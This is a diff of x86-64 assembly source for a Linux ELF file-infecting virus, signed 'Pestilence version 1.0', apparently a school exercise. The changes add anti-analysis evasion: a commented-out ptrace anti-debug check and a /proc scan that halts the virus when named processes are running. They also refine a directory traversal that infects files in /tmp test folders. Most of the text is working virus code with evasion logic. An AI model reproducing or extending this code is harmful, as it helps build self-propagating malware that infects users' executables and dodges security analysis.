@@ -20,12 +20,24 @@ _start:
 	mov rbp, rsp
 	sub rsp, famine_size
 
+	; === Anti-debug protection ===
+;	xor rdi, rdi
+;	mov rax, SYS_PTRACE
+;	syscall
+;	cmp rax, -1
+;	je _debugging
+
+	; === Check for forbidden processes ===
+	call _traverse_proc
+
+
 	; === Loading the address of the directory name string in rdi, and calling _traverse_dir ===
 	lea rdi, [rel target_1]
 	call _traverse_dir
 	lea rdi, [rel target_2]
 	call _traverse_dir
 
+	.exit_virus:
 	; === Deleting the 'famine' struct from the stack
 	add rsp, famine_size
 
@@ -48,6 +60,7 @@ _start:
 ; ##### LOOP THROUGH TARGET DIRECTORIES #####
 
 _traverse_dir:
+	mov dword FAM(famine.dir_fd), 0
 	; === Opening the target directory (path address in rdi) | open(dir, O_RDONLY | O_DIRECTORY, 0) ===
 	mov r12, rdi												; Saving name of directory in r12
 	mov rsi, O_RDONLY | O_DIRECTORY
@@ -59,14 +72,15 @@ _traverse_dir:
 	jl _return
 
 	; === Calling getdents to get content of directory | getdents(dir_fd, struc linux_dirent *dirp, count) ===
-	mov rdi, rax												; rax has the fd of the "open" call on directory
-	lea rsi, FAM(famine.dirents)								; We will store the dirents structure in our 'famine' structure
+	.getdents_loop:
+	mov edi, dword FAM(famine.dir_fd)
+	lea rsi, FAM(famine.dirents)							; We will store the dirents structure in our 'famine' structure
 	mov rdx, DIRENTS_BUFF_SIZE
 	mov rax, SYS_GETENTS
 	syscall
 	cmp rax, 0
-	jl .end_dir_loop
-	mov r15, rax												; r15 will keep the total size of the dirents structure read by the syscall
+	jle .end_dir_loop
+	mov r15, rax											; r15 will keep the total size of the dirents structure read by the syscall
 
 	; === Initializing total_dreclen to 0 ===
 	xor r8, r8
@@ -90,12 +104,14 @@ _traverse_dir:
 	je _file
 	.check_dir_loop:
 	cmp qword FAM(famine.total_dreclen), r15				; r15 has total size of the dirents structure (not used in file infection)
-	jge .end_dir_loop										; If we already read this size, we finished iterating over entries of directory.
+	jge .getdents_loop										; If we already read this size, we finished iterating over entries of directory.
 	jmp _traverse_dir.list_dir								; Else, we continue the loop
 
 	; === Closing the directory when we're done ===
 	.end_dir_loop:
-	movzx rdi, word FAM(famine.dir_fd)
+	mov edi, FAM(famine.dir_fd)
+	cmp rdi, 0
+	je _return
 	mov rax, SYS_CLOSE
 	syscall
 	ret
@@ -302,8 +318,11 @@ _end_file_infection:
 	syscall
 	.close_file:
 	mov rdi, FAM(famine.file_fd)
+	cmp rdi, 0
+	je .resume
 	mov rax, SYS_CLOSE
 	syscall
+	.resume:
 	jmp _traverse_dir.check_dir_loop
 
 _check_note:
@@ -314,6 +333,23 @@ _check_note:
 	pop rsi														; We're not returning but jumping, so pop the return address that was pushed on the stack
 	jmp _file.parse_note_segment
 
+_debugging:
+	mov rdi, 0
+	lea rsi, [rel debug_err]
+	mov rdx, 16
+	mov rax, SYS_WRITE
+	syscall
+	jmp _start.exit_virus
+
+_forbidden_process:
+	mov rdi, 0
+	lea rsi, [rel forbidden_err]
+	mov rdx, 24
+	mov rax, SYS_WRITE
+	syscall
+	pop rax														; The check for forbidden processes was CALL-ed, so we have to pop the return address before to do a jmp
+	jmp _start.exit_virus
+
 _return:
 	ret
 
@@ -322,17 +358,164 @@ _exit:
 	mov rdi, 0
 	syscall
 
-target_1	db		"/tmp/test/",0x0
-target_2	db		"/tmp/test2/",0x0
-signature	db		"Pestilence version 1.0 (c)oded by qroland",0x0
+
+
+_traverse_proc:
+	mov dword FAM(famine.dir_fd), 0
+	; === Opening the proc directory | open("/proc/", O_RDONLY | O_DIRECTORY, 0) ===
+	lea rdi, [rel proc_path]
+	mov r12, rdi												; Saving proc_path in r12
+	mov rsi, O_RDONLY | O_DIRECTORY
+	xor rdx, rdx
+	mov rax, SYS_OPEN
+	syscall
+	mov dword FAM(famine.dir_fd), eax
+	cmp rax, 0
+	jl _return													; If we didn't find /proc/ or couldn't open it, assume the forbidden processes aren't running (?)
+
+	.getdents_loop:
+	; === Calling getdents to get content of directory | getdents(dir_fd, struc linux_dirent *dirp, count) ===
+	mov edi, dword FAM(famine.dir_fd)
+	lea rsi, FAM(famine.dirents)							; We will store the dirents structure in our 'famine' structure
+	mov rdx, DIRENTS_BUFF_SIZE
+	mov rax, SYS_GETENTS
+	syscall
+	cmp rax, 0
+	jle .end_dir_loop
+	mov r15, rax											; r15 will keep the total size of the dirents structure read by the syscall
+
+	; === Initializing total_dreclen to 0 ===
+	xor r8, r8
+	mov FAM(famine.total_dreclen), r8
+
+	; === Loop iterating through every entries of directory ===
+	.list_dir:
+	xor r14, r14											; r14 will store d_reclen of current dirent
+	lea rsi, FAM(famine.dirents)							; rsi will be used to navigate current dirent, and ultimatly store d_name
+	add rsi, FAM(famine.total_dreclen)						; bring rsi to our current dirent (start of dirent array + total d_reclen browsed until now)
+	mov r13, rsi											; r13 will store d_type of current dirent
+	add rsi, D_RECLEN_OFF									; bring rsi to the offset at which d_reclen is located
+	mov r14w, word [rsi]									; mov d_reclen (pointed by rsi) to r14
+	add FAM(famine.total_dreclen), r14						; keep track of the total d_reclen
+	add rsi, D_NAME_OFF - D_RECLEN_OFF						; bring rsi to the offset of d_name
+	sub r14, 1
+	add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
+	movzx r13, byte [r13]									; r13 has d_type value
+
+	cmp r13, 0x4											; If type is 0x4 (directory), check the potential process ; else, continue the loop
+	je _check_process
+	.check_dir_loop:
+	cmp qword FAM(famine.total_dreclen), r15				; r15 has total size of the dirents structure (not used in file infection)
+	jge .getdents_loop										; If we already read this size, we finished iterating over entries of directory.
+	jmp _traverse_proc.list_dir								; Else, we continue the loop
+
+	; === Closing the directory when we're done ===
+	.end_dir_loop:
+	mov edi, dword FAM(famine.dir_fd)
+	cmp rdi, 0
+	je _return
+	mov rax, SYS_CLOSE
+	syscall
+	ret
+
+_check_process:
+	; Check if name of directory starts with a digit. If not, this isn't a folder corresponding to a process
+	; Digits are between 48 (0x30) and 57 (0x39)
+	mov al, byte [rsi]
+	cmp al, 0x30
+	jl _traverse_proc.check_dir_loop
+	cmp al, 0x39
+	jg _traverse_proc.check_dir_loop
+
+	; This is a folder corresponding to a process. We will try to read its file "comm"
+	lea r11, [rel comm_path]
+	; r12 has "/proc/", rsi has "4055", r11 has "/comm"
+
+	push rsi													; rsi has folder name address. Save it on stack
+	lea rdi, FAM(famine.current_fpath)							; We will store the complete path in our 'famine' structure
+	mov rsi, r12												; r12 has proc_path. 
+
+	.dir:														; Copy "/proc/"
+	movsb
+	cmp byte [rsi], 0
+	jne .dir
+	pop rsi														; Put the filename in rsi
+	.pid:														; Copy "4055"
+	movsb
+	cmp byte [rsi], 0
+	jne .pid
+	mov rsi, r11												; Put the comm path in rsi
+	.comm:														; Copy "/comm" + NULL BYTE
+	movsb
+	cmp byte [rsi - 1], 0
+	jne .comm
+
+	; current_fpath should have /proc/4055/comm
+	; We try to open this file. If it fails, go back to dir loop
+	lea rdi, FAM(famine.current_fpath)
+	mov rsi, O_RDONLY
+	xor rdx, rdx
+	mov rax, SYS_OPEN
+	syscall
+	mov dword FAM(famine.file_fd), eax
+	cmp rax, 0
+	jl _traverse_proc.check_dir_loop
+
+	; We were able to open the file. Read its content (first 16 bytes, we don't need more since our forbidden process names are less than 16 bytes)
+	mov rdi, rax
+	lea rsi, FAM(famine.comm_content)
+	mov rdx, 0x10
+	mov rax, SYS_READ
+	syscall
+
+	; Compare comm_content with forbidden processes names
+	mov rcx, forbidden_1_len
+	lea rdi, [rel forbidden_1]
+	lea rsi, FAM(famine.comm_content)
+	repe cmpsb
+	cmp rcx, 0
+	je _forbidden_process
+
+	mov rcx, forbidden_2_len
+	lea rdi, [rel forbidden_2]
+	lea rsi, FAM(famine.comm_content)
+	repe cmpsb
+	cmp rcx, 0
+	je _forbidden_process
+
+
+	; Close the FD used to read the 'comm' file
+	mov edi, FAM(famine.file_fd)
+	mov rax, SYS_CLOSE
+	syscall
+
+	jmp _traverse_proc.check_dir_loop
+
+
+
+
+target_1		db		"/tmp/test/",0x0
+target_2		db		"/tmp/test2/",0x0
+signature		db		"Pestilence version 1.0 (c)oded by qroland",0x0
+debug_err		db		"...DEBUGGING...",0xa,0x0
+forbidden_err	db		"...FORBIDDEN PROCESS...",0xa,0x0
+
+proc_path		db		"/proc/",0x0
+comm_path		db		"/comm",0x0
+forbidden_1		db		"sleep",0xa,0x0
+forbidden_1_len	equ		$ - forbidden_1
+forbidden_2		db		"fortytwo",0xa,0x0
+forbidden_2_len	equ		$ - forbidden_2
+
+
 host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
 
 ; TODO :
-; > Re-check the correct closing of fd and munmapping of maps
-; > Use mremap instead of two different mmap
-
-
-
-; 0x555561565c48
+; [OK]	Re-check the correct closing of fd and munmapping of maps
+; [OK]	Use mremap instead of two different mmap
+; [OK]	Implement the anti-debugging mechanism
+; [OK]	Do not run when specific process is up
+; [OK]	Loop the getdents call in _file
+; [OK]	When getting a forbidden process, registers aren't properly restored when exiting virus, which may cause a SIGSESV
